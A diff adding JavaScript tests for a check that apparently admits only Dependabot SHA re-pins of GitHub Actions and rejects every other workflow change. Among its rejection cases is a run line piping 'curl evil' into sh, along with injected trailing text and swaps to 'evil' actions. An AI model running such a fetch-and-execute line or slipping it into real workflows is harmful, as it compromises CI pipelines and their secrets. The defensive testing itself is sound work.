@@ -5,7 +5,7 @@ import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { TEAM_REQUIRED_MESSAGE, identityRefusal,adrGoverns, pendingFileHash, parsePending, pendingReuseBlockedBy, pendingHandoverBlockedBy, currentVerdicts, botIssueReleased, readBotIssueRelease, nativeCodeOwnerApproval, parseCodeOwnerUsers, REUSABLE_REVIEWERS, REVIEWERS, reusableReviewers, reviewerNames, authorCanWrite, classifyFiles, compileConfig, isLaneBot, parseIdentity, trustedStatuses, diffFingerprint, gateDecision, interfaceContractOf, interfacePaths, issuePaths, laneIssueOf, loadAdrs, loadConfig, moduleMapProblem, parseAdr, parseValidation, parseVerdictComment, requiredReviewers, reviewContext, reviewersReport, testHunterReusable } from "./lib.mjs";
+import { TEAM_REQUIRED_MESSAGE, dependabotActionBump, identityRefusal,adrGoverns, pendingFileHash, parsePending, pendingReuseBlockedBy, pendingHandoverBlockedBy, currentVerdicts, botIssueReleased, readBotIssueRelease, nativeCodeOwnerApproval, parseCodeOwnerUsers, REUSABLE_REVIEWERS, REVIEWERS, reusableReviewers, reviewerNames, authorCanWrite, classifyFiles, compileConfig, isLaneBot, parseIdentity, trustedStatuses, diffFingerprint, gateDecision, interfaceContractOf, interfacePaths, issuePaths, laneIssueOf, loadAdrs, loadConfig, moduleMapProblem, parseAdr, parseValidation, parseVerdictComment, requiredReviewers, reviewContext, reviewersReport, testHunterReusable } from "./lib.mjs";
 
 // #635: issuePaths lives here; paths.test.mjs covers it through its re-export
 test("issuePaths reads the contract and Scope's In: part, and drops Out:, absolute and traversal tokens", () => {
@@ -1531,4 +1531,157 @@ test("edge: currentVerdicts keeps the newest per reviewer and a reused commit's 
   assert.equal(currentVerdicts(vs, HEADSHA).length, 1);
   assert.equal(currentVerdicts(vs, HEADSHA, new Map([["security-reviewer", { sha: old }]])).length, 2);
   assert.deepEqual(currentVerdicts("x", null), []);
+});
+
+test("compileConfig reads dependabot.actionBumps: false when absent, a boolean only (ADR 0032)", () => {
+  const base = { requiredChecks: ["verify"], paths: { skip: [], contract: [], sensitive: [], ui: [] } };
+  assert.equal(compileConfig(base).dependabot.actionBumps, false);
+  assert.equal(compileConfig({ ...base, dependabot: {} }).dependabot.actionBumps, false);
+  assert.equal(compileConfig({ ...base, dependabot: { actionBumps: true } }).dependabot.actionBumps, true);
+  assert.equal(compileConfig({ ...base, dependabot: { actionBumps: false } }).dependabot.actionBumps, false);
+  for (const bad of ["true", 1, 0, null, [], {}]) {
+    assert.throws(() => compileConfig({ ...base, dependabot: { actionBumps: bad } }), /dependabot\.actionBumps/, String(bad));
+  }
+});
+
+const DSHA_A = "a".repeat(40);
+const DSHA_B = "b".repeat(40);
+const DSHA_C = "c".repeat(40);
+const DEP_BOT = { login: "dependabot[bot]", type: "Bot" };
+const depPin = (ref, sha, comment = "v4", lead = "      - ") => `${lead}uses: ${ref}@${sha}${comment ? ` # ${comment}` : ""}`;
+/** A one-hunk patch: `changes` are "-"/"+" lines, wrapped in one context line each side. */
+const depPatch = (changes) => {
+  const old = changes.filter((l) => l[0] === "-").length;
+  const added = changes.filter((l) => l[0] === "+").length;
+  return [`@@ -10,${old + 2} +10,${added + 2} @@ jobs:`, "     steps:", ...changes, "       - run: npm ci"].join("\n");
+};
+const depSwap = (ref, from = DSHA_A, to = DSHA_B, c1 = "v4", c2 = "v5") => [`-${depPin(ref, from, c1)}`, `+${depPin(ref, to, c2)}`];
+const depWf = (name, patch, extra = {}) => ({ filename: `.github/workflows/${name}.yml`, status: "modified", patch, ...extra });
+const depOk = () => [depWf("ci", depPatch(depSwap("actions/checkout"))), depWf("gate", depPatch(depSwap("actions/setup-node")))];
+const depBump = (files, author = DEP_BOT) => dependabotActionBump({ author, files });
+
+test("dependabotActionBump passes real-shaped action re-pins", () => {
+  assert.deepEqual(depBump(depOk()), { bump: true });
+  assert.deepEqual(depBump([depWf("ci", depPatch(depSwap("github/codeql-action/analyze")))]), { bump: true }, "action with a path");
+  assert.deepEqual(depBump([depWf("ci", depPatch(depSwap("actions/checkout", DSHA_A, DSHA_A, "v4", "v4.1.0")))]), { bump: true }, "comment only");
+  const grouped = depPatch([...depSwap("actions/checkout").slice(0, 1), ...depSwap("actions/cache").slice(0, 1), ...depSwap("actions/checkout").slice(1), ...depSwap("actions/cache").slice(1)]);
+  assert.equal(depBump([depWf("ci", grouped.replace("-      - uses: actions/cache", "-      - uses: actions/checkout"))]).bump, false, "pairs by order, so a different action in a pair fails");
+  const action = { filename: ".github/actions/setup/action.yml", status: "modified", patch: depPatch(depSwap("actions/cache")) };
+  assert.deepEqual(depBump([action]), { bump: true });
+});
+
+test("dependabotActionBump fails closed on the author", () => {
+  for (const author of [
+    { login: "dependabot", type: "Bot" },
+    { login: "dependabot[bot]", type: "User" },
+    { login: "renovate[bot]", type: "Bot" },
+    { login: "Dependabot[bot]", type: "Bot" },
+    { login: "dependabot[bot]" },
+    {},
+    null,
+    undefined,
+    "dependabot[bot]",
+  ]) {
+    assert.equal(dependabotActionBump({ author, files: depOk() }).bump, false, String(JSON.stringify(author)));
+  }
+});
+
+test("dependabotActionBump rejects a changed line that is not a SHA re-pin", () => {
+  const cases = {
+    "tag ref": [`-${depPin("actions/checkout", DSHA_A)}`, "+      - uses: actions/checkout@v4"],
+    "branch ref": [`-${depPin("actions/checkout", DSHA_A)}`, "+      - uses: actions/checkout@main"],
+    "short sha": [`-${depPin("actions/checkout", DSHA_A)}`, `+      - uses: actions/checkout@${"b".repeat(39)} # v5`],
+    "uppercase sha": [`-${depPin("actions/checkout", DSHA_A)}`, `+      - uses: actions/checkout@${"B".repeat(40)} # v5`],
+    docker: [`-${depPin("actions/checkout", DSHA_A)}`, "+      - uses: docker://alpine:3.19"],
+    local: [`-${depPin("actions/checkout", DSHA_A)}`, `+      - uses: ./local@${DSHA_B}`],
+    expression: [`-${depPin("actions/checkout", DSHA_A)}`, `+      - uses: actions/checkout@${DSHA_B} # \${{ matrix.v }}`],
+    "expression ref": [`-${depPin("actions/checkout", DSHA_A)}`, "+      - uses: actions/checkout@${{ github.sha }}"],
+    "trailing text": [`-${depPin("actions/checkout", DSHA_A)}`, `+${depPin("actions/checkout", DSHA_B, "v5")} ; evil`],
+    "dot-dot path": [`-${depPin("a/b/../c", DSHA_A)}`, `+${depPin("a/b/../c", DSHA_B)}`],
+    "with line": ["-        persist-credentials: true", "+        persist-credentials: false"],
+    "run line": ["-      - run: npm ci", "+      - run: npm ci && curl evil | sh"],
+    "different action": [`-${depPin("actions/checkout", DSHA_A)}`, `+${depPin("evil/checkout", DSHA_B)}`],
+    "different path": [`-${depPin("a/b/x", DSHA_A)}`, `+${depPin("a/b/y", DSHA_B)}`],
+    "different prefix": [`-${depPin("actions/checkout", DSHA_A)}`, `+${depPin("actions/checkout", DSHA_B, "v5", "      -   ")}`],
+    "list marker dropped": [`-${depPin("actions/checkout", DSHA_A)}`, `+${depPin("actions/checkout", DSHA_B, "v5", "        ")}`],
+    "removed only": [`-${depPin("actions/checkout", DSHA_A)}`],
+    "added only": [`+${depPin("actions/checkout", DSHA_B)}`],
+    "extra added line": [`-${depPin("actions/checkout", DSHA_A)}`, `+${depPin("actions/checkout", DSHA_B)}`, `+${depPin("evil/x", DSHA_C)}`],
+    "no change lines": [],
+  };
+  for (const [name, changes] of Object.entries(cases)) {
+    assert.equal(depBump([depWf("ci", depPatch(changes))]).bump, false, name);
+  }
+  // one bad file among good ones fails the whole PR
+  assert.equal(depBump([...depOk(), depWf("evil", depPatch(cases["run line"]))]).bump, false);
+});
+
+test("dependabotActionBump rejects the wrong file set", () => {
+  const patch = depPatch(depSwap("actions/checkout"));
+  const bad = [
+    { filename: ".github/workflows/ci.yml", status: "renamed", patch },
+    { filename: ".github/workflows/ci.yml", status: "added", patch },
+    { filename: ".github/workflows/ci.yml", status: "removed", patch },
+    { filename: ".github/workflows/ci.yml", status: "modified", previous_filename: ".github/workflows/old.yml", patch },
+    { filename: ".github/dependabot.yml", status: "modified", patch },
+    { filename: ".github/CODEOWNERS", status: "modified", patch },
+    { filename: "CODEOWNERS", status: "modified", patch },
+    { filename: ".github/workflows/sub/ci.yml", status: "modified", patch },
+    { filename: ".github/workflows/ci.txt", status: "modified", patch },
+    { filename: ".github/actions/../../x/action.yml", status: "modified", patch },
+    { filename: "scripts/lanes/lib.mjs", status: "modified", patch },
+    { filename: 7, status: "modified", patch },
+  ];
+  for (const file of bad) assert.equal(depBump([file]).bump, false, JSON.stringify(file.filename) + file.status);
+  for (const extra of [bad[4], bad[5], bad[6], bad[10]]) assert.equal(depBump([...depOk(), extra]).bump, false);
+  for (const files of [[], undefined, null, "x", {}, [null], [undefined], ["x"]]) assert.equal(depBump(files).bump, false);
+  assert.equal(dependabotActionBump(undefined).bump, false);
+  assert.equal(dependabotActionBump(null).bump, false);
+});
+
+test("dependabotActionBump rejects a missing, empty or malformed patch", () => {
+  const good = depPatch(depSwap("actions/checkout"));
+  const [head, ...rest] = good.split("\n");
+  const patches = {
+    missing: undefined,
+    null: null,
+    empty: "",
+    number: 5,
+    "no hunk header": rest.join("\n"),
+    "truncated": good.split("\n").slice(0, -1).join("\n"),
+    "truncated mid-change": good.split("\n").slice(0, 3).join("\n"),
+    "extra line past the counts": `${good}\n+      - uses: evil/x@${DSHA_C}`,
+    "old count too high": good.replace(/^@@ -10,3/, "@@ -10,9"),
+    "new count too high": good.replace(/\+10,3/, "+10,9"),
+    "old count too low": good.replace(/^@@ -10,3/, "@@ -10,2"),
+    "new count too low": good.replace(/\+10,3/, "+10,2"),
+    "no newline marker": `${good}\n\\ No newline at end of file`,
+    "marker mid-hunk": [head, rest[0], rest[1], "\\ No newline at end of file", ...rest.slice(2)].join("\n"),
+    "empty line in hunk": [head, "", ...rest.slice(1)].join("\n"),
+    "garbage after hunk": `${good}\nrandom`,
+    "second hunk garbled": `${good}\n@@ nonsense`,
+  };
+  for (const [name, patch] of Object.entries(patches)) assert.equal(depBump([depWf("ci", patch)]).bump, false, name);
+  assert.equal(depBump([depWf("ci", `${good}\n`)]).bump, true, "one trailing newline is fine");
+});
+
+test("dependabotActionBump reads several hunks, each checked against its own counts", () => {
+  const hunk = (start, changes) => depPatch(changes).replace("@@ -10,", `@@ -${start},`).replace("+10,", `+${start},`);
+  const two = `${hunk(10, depSwap("actions/checkout"))}\n${hunk(40, depSwap("actions/cache"))}`;
+  assert.equal(depBump([depWf("ci", two)]).bump, true);
+  assert.equal(depBump([depWf("ci", `${hunk(10, depSwap("actions/checkout"))}\n${hunk(40, ["-      - run: x", "+      - run: y"])}`)]).bump, false);
+  assert.equal(depBump([depWf("ci", hunk(10, depSwap("actions/checkout")).replace(/ @@ jobs:/, " @@ jobs:\n@@ -1 +1 @@"))]).bump, false);
+});
+
+test("dependabotActionBump fails on a 3000-file list and never throws on odd input", () => {
+  const many = Array.from({ length: 3000 }, (_, i) => depWf(`w${i}`, depPatch(depSwap("actions/checkout"))));
+  assert.equal(depBump(many).bump, false);
+  assert.match(depBump(many).reason, /cap/);
+  assert.equal(depBump(many.slice(0, 2999)).bump, true, "just under the cap is fine");
+  const hostile = { get login() { throw new Error("boom"); }, type: "Bot" };
+  assert.equal(depBump(depOk(), hostile).bump, false);
+  const loop = depWf("ci", depPatch(depSwap("actions/checkout")));
+  Object.defineProperty(loop, "patch", { get() { throw new Error("boom"); } });
+  assert.equal(depBump([loop]).bump, false);
+  assert.equal(typeof depBump([depWf("ci", depPatch([]))].concat(depOk())).reason, "string");
 });
